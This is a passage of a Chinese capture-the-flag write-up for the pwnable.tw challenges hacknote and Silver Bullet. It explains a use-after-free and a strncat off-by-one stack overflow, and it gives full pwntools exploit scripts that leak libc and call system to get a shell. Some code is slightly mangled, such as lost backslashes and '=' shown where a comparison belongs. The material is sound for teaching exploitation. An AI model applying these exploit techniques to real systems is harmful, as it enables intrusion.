      v1 = atoi(&buf);
      if ( v1 = dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( ptr[v1] )
        (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
      return __readgsdword(0x14u) ^ v3;
    }
可以看到这里调用结构体第一个位置的地址所指的函数，参数就是结构体本身
###  0x03 delete_note
    unsigned int delete_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf; // [esp+8h] [ebp-10h]
      unsigned int v3; // [esp+Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, &buf, 4u);
      v1 = atoi(&buf);
      if ( v1 = dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( ptr[v1] )
      {
        free(*((void **)ptr[v1] + 1));
        free(ptr[v1]);
        puts("Success");
      }
      return __readgsdword(0x14u) ^ v3;
    }
可以看到这里只是用free释放  
但没有将指针置空为NULL  
产生一个迷途指针  
这里便可利用这个指针来造成堆溢出来获得shell
###  0x04 malloc分配机制
    #define request2size(req)                                         
      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK 4字节，64位->8字节
MINSIZE:
    #define MINSIZE  
      (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
MIN_CHUNK_SIZE为一个chunk结构体的大小：为16字节
    struct malloc_chunk {
      INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
**MALLOC_ALIGNMENT为2*SIZE_SZ**  
 **MALLOC_ALIGN_MASK 为2*SIZE_SZ-1**  
 **由此即可通过最开始的request2size(req) 计算出系统分配出的内存大小** ：
    例如，32位时：
    MINSIZE：(16+2*4-1)&~(2*4-1)=16
    申请字节：
    1-4字节：(req) + SIZE_SZ + MALLOC_ALIGN_MASK =MINSIZE
    系统分配：
    (req) + SIZE_SZ + MALLOC_ALIGN_MASK) &~MALLOC_ALIGN_MASK=16字节
    申请字节：
    13字节
    系统分配：
    (req) + SIZE_SZ + MALLOC_ALIGN_MASK) &~MALLOC_ALIGN_MASK=24字节
    //可以看到分配相邻上下大小之差为系统指针大小（32位8字节，64位16字节）
**又因fastbin采用LIFO原则(其会在空表从后往前寻找首先合适的堆块)**  
故而我们需要先申请两个note  
再利用delete制造迷途指针并利用堆溢出覆盖堆中数据从而拿到shell
###  0x05 漏洞利用
首先看到：
    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
当我们print_note时，会调用结构体中第一个地址指向的函数  
函数参数就是结构体自身  
我们需要溢出覆盖掉一个之前申请过的结构体  
将结构体第一个函数地址修改（获得shell，需要覆盖为system的地址）  
而一个结构体16个字节，system的参数即为结构体本身  
这里需要使用system的参数截断  
例如使用:
    "||sh"或者";sh"
这里可以利用malloc的分配机制  
首先申请两个note，长度>12(例，申请16字节)  
这时候堆内：
    16->24->16->24
而后使用delete_note来free这4个空间  
当我们再次add_note一个16字节的note时  
根据fastbin的LIFO原则  
从后往前第一个满足的空间便是第一个空间（第三个空间处覆盖为结构体）  
即：note的文本内容会修改原本0号结构体  
 **如果我们修改结构体中*text内容为.got.plt中的一个地址**  
 **那么print_note第0号即会打印出函数加载后的真实地址**  
再根据其在libc库中的偏移求出程序加载动态库的基址  
进而计算出system函数地址  
再继续修改一次结构体数据为system的地址（参数截断上面已说明）  
重新print_note来调用修改后结构体中地址对应的system函数  
进而获取shell
###  0x06 EXP
    from pwn import *
    def add_note(size,content):
          p.recvuntil("choice :")
          p.sendline("1")
          p.recvuntil("size :")
          p.sendline(size)
          p.recvuntil("Content :")
          p.sendline(content)
    def delete_note(index):
          p.recvuntil("choice :")
          p.sendline("2")
          p.recvuntil("Index :")
          p.sendline(index)
    def print_note(index):
          p.recvuntil("choice :")
          p.sendline("3")
          p.recvuntil("Index :")
          p.sendline(index)
    p=remote("chall.pwnable.tw", 10102)
    elf=ELF("./hacknote")
    elib=ELF("./libc_32.so.6")
    read_got=elf.got["read"]
    putnote=0x804862b
    add_note("16",15*"a")
    add_note("16",15*"a")
    delete_note('0')
    delete_note('1')
    add_note('8',p32(putnote)+p32(read_got))
    print_note('0')
    read_addr=u32(p.recv()[:4])
    sys_addr=read_addr-elib.symbols["read"]+elib.symbols["system"]
    delete_note('2')
    add_note('8',p32(sys_addr)+";shx00")
    print_note('0')
    p.interactive()
## pwnable.tw_challenge_Silver Bullet
打开程序：
    ./silver_bullet
    +++++++++++++++++++++++++++
           Silver Bullet       
    +++++++++++++++++++++++++++
     1. Create a Silver Bullet 
     2. Power up Silver Bullet 
     3. Beat the Werewolf      
     4. Return                 
    ++++++++++++++++++++++++++
类似一个游戏，开始没看懂怎么玩，直接载入IDA分析：
###  0x01 power_up
    int __cdecl power_up(char *dest)
    {
      char s; // [esp+0h] [ebp-34h]
      size_t v3; // [esp+30h] [ebp-4h]
      v3 = 0;
      memset(&s, 0, 0x30u);
      if ( !*dest )
        return puts("You need create the bullet first !");
      if ( *((_DWORD *)dest + 12) > 0x2Fu )         // *(dest+12)指针指向的值 > 47
        return puts("You can't power up any more !");
      printf("Give me your another description of bullet :");
      read_input(&s, 48 - *((_DWORD *)dest + 12));  // 限制读入长度
      strncat(dest, &s, 48 - *((_DWORD *)dest + 12)); //使用strncat连接两字符串，会自动在结尾添加x00
      v3 = strlen(&s) + *((_DWORD *)dest + 12);
      printf("Your new power is : %un", v3);
      *((_DWORD *)dest + 12) = v3;
      return puts("Enjoy it !");
    }
###  0x02 create_bullet
    int __cdecl create_bullet(char *s)
    {
      size_t v2; // ST08_4
      if ( *s )
        return puts("You have been created the Bullet !");
      printf("Give me your description of bullet :");
      read_input(s, 0x30u);
      v2 = strlen(s);
      printf("Your power is : %un", v2);           // s的长度
      *((_DWORD *)s + 12) = v2;                     // +12指12个dword长度
      return puts("Good luck !!");
    }
###  0x03 漏洞利用
可以看出漏洞与决定游戏成功的beat函数无关  
关键在power_up函数处：
    read_input(&s, 48 - *((_DWORD *)dest + 12));  
     strncat(dest, &s, 48 - *((_DWORD *)dest + 12));
这里依赖*dest+12处的值来限制读取长度  
而*dest后的数据可以利用strnca修改  
 **strncat会在字符串结尾自动补全x00**  
当我们先读取了一定长度字符串  
再连接一定长度字符串，两字符串恰好相加为48字节  
并由于strncat自动添加x00，便会覆盖*dest+12处的数据，造成栈溢出  
而此时依然依赖*dest+12处的值来限制读取长度  
我们便可以继续覆盖栈内数据  
直到将main返回地址修改  
我们需要调用system，便需要直到libc加载的基地址  
同hacknote相同  
我们可以修改main返回地址为put地址(即put在plt中的地址)  
参数为.got中一个地址  
便可利用put出的值以及此函数在libc中的位置计算出libc的基址  
进而计算出system地址  
而后我们重新利用上面的过程来调用system  
 **所以我们要重新调用main来重复利用上述过程**  
 **此处我们将put的返回地址覆盖为main开始地址即可**  
有一点注意：  
只有beat()成功时才会返回main  
否则直接4.return会exit(0)方式退出  
故而覆盖*dest+12处的数时，需要让他满足win的条件
###  0x04 EXP
    from pwn import *
    def create(s):
        p.recvuntil(':')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(s)
    def power_up(s):
        p.recvuntil(':')
        p.sendline('2')
        p.recvuntil(':')
        p.send(s)
    def beat():
        p.recvuntil(':')
        p.sendline('3')
    p=remote('chall.pwnable.tw', 10103)
    elf=ELF("./silver_bullet")
    elib=ELF("./libc_32.so.6")
    bin_sh_off = 0x158e8b
    puts_addr=0x80484a8
    read_got=elf.got["read"]
    main_addr=elf.symbols["main"]
    create('a'*47)
    power_up('a')
    payload = 'xff'*7+p32(puts_addr)+p32(main_addr)+p32(read_got)
    power_up(payload)
    beat()
    p.recvuntil("You win !!n")
    read_addr = u32(p.recv(4))
    sys_addr=read_addr-elib.symbols["read"]+elib.symbols["system"]
    bin_sh_addr=read_addr-elib.symbols["read"]+bin_sh_off
    create('a'*47)
    power_up('a')
    payload2='xff'*7 + p32(sys_addr) + 'a'*4 + p32(bin_sh_addr)
    power_up(payload2)
    beat()
    p.interactive()
审核人：yiwang 编辑：边边